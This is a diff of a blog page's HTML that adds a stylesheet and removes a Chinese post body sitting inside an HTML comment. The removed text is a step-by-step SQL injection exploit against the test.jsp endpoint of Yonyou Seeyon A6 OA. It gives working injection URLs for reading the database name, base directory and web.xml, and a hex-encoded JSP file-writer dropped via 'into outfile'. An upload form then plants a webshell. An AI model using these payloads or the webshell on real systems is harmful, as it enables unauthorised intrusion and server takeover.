@@ -76,6 +76,9 @@
 <link rel="stylesheet" href="/assets/css/custom-toc.css">
 
   
+<link rel="stylesheet" href="/assets/css/codescan-figures.css">
+
+  
   <!-- <link href="/css/show.ua.css" rel="stylesheet" type="text/css" > -->
   <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
   <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700&display=swap" rel="stylesheet">
@@ -326,57 +329,7 @@ ga('send', 'pageview');
         <span id="busuanzi_container_page_pv">
           阅读次数<span id="busuanzi_value_page_pv"></span>
         </span>
-        <p>用友致远A6协同系统 <code>/yyoa/common/js/menu/test.jsp</code> 文件 S1 参数SQL注入漏洞 </p>
-<p>注入点为S1变量，通过探测，发现是mysql数据库</p>
-<p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=</code></p>
-<p>于是构造注入语句查询数据库名：</p>
-<p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20database())</code></p>
-<span id="more"></span>
-
-<table>
-<thead>
-<tr>
-<th>序号</th>
-<th>database()</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>mysql3235</td>
-</tr>
-</tbody></table>
-<p>Mysql注入中，我们使用into outfile 来写入数据，用此方法注入webshell，前提条件两个：</p>
-<p>1：root权限</p>
-<p>2：物理路径</p>
-<p>我们探测一下web根目录</p>
-<p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)</code></p>
-<table>
-<thead>
-<tr>
-<th>序号</th>
-<th>@@basedir</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>F:&#x2F;UFseeyon&#x2F;OA&#x2F;mysql&#x2F;bin&#x2F;..&#x2F;</td>
-</tr>
-</tbody></table>
-<p>通过yyoa目录结构猜测物理路径为</p>
-<p><code>F:/UFseeyon/OA/tomcat/webapps/yyoa/</code></p>
-<p>可以使用load_file判断是否正确</p>
-<p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20load_file(%27F:/UFseeyon/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27)</code></p>
-<p>利用mysql into outfile写shell：由于jsp一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造进行webshell上传：</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">&quot;f&quot;</span>)!=<span class="literal">null</span>)(<span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(application.getRealPath(<span class="string">&quot;\\&quot;</span>)+request.getParameter(<span class="string">&quot;f&quot;</span>))).write(request.getParameter(<span class="string">&quot;t&quot;</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>由于特殊符号存在，URL编码会造成写入后代码错误，故采用hex编码后unhex处理上传，写入文件名为：he1p.jsp</p>
-<p><a target="_blank" rel="noopener" href="http://xx/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27">http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27</a></p>
-<p>本地构造上传：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xx/yyoa/he1p.jsp?f=we1come.jsp&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">t</span> <span class="attr">cols</span>=<span class="string">120</span> <span class="attr">rows</span>=<span class="string">10</span> <span class="attr">width</span>=<span class="string">45</span>&gt;</span>your code<span class="tag">&lt;/<span class="name">testarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>上传后获取webshell地址为：<a target="_blank" rel="noopener" href="http://xx/yyoa/we1come.jsp">http://xx/yyoa/we1come.jsp</a></p>
-<p> <a href="http://www.pa55w0rd.online/yyoa/">http://www.pa55w0rd.online/yyoa/</a> </p>
--->
+        -->
       
 
     </div>
